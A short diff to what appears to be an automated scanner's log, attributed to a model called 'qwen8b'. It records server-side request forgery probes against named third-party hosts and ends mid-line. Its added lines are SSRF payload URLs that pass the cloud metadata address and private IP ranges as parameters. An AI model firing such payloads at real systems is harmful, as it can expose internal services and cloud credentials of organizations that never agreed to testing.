@@ -1016,3 +1016,13 @@ testability: PASSIVE
 [LEARN] REJECTED SSRF @ docker-registry.docker.com/v2/: DNS resolution failure prevents testing  
 [LEARN] ACCEPTED SSRF @ https://api.coxautoinc.com/endpoint: Internal IP param=169.254.169.254 returns 403  
 [RISK] 88 reason: High exposure from Docker registry SSRF potential and CoxAutoInc internal IP routing capabilities
+## 2026-08-20 15:53:01 UTC (model qwen8b)
+[NEW] docker-registry.docker.com/v2/?param=169.254.169.254
+[NEW] docker-registry.docker.com/v2/?param=10.0.0.1
+[NEW] docker-registry.docker.com/v2/?param=172.16.0.1
+[NEW] docker-registry.docker.com/v2/?param=127.0.0.1
+[CHANGED] https://api.coxautoinc.com/endpoint?param=192.168.1.1
+[CHANGED] https://api.coxautoinc.com/endpoint?param=169.254.169.254
+[CHANGED] https://api.coxautoinc.com/endpoint?param=10.0.0.1
+[CHANGED] https://api.coxautoinc.com/endpoint?param=172.16.0.1
+[PRIO] https://api.c
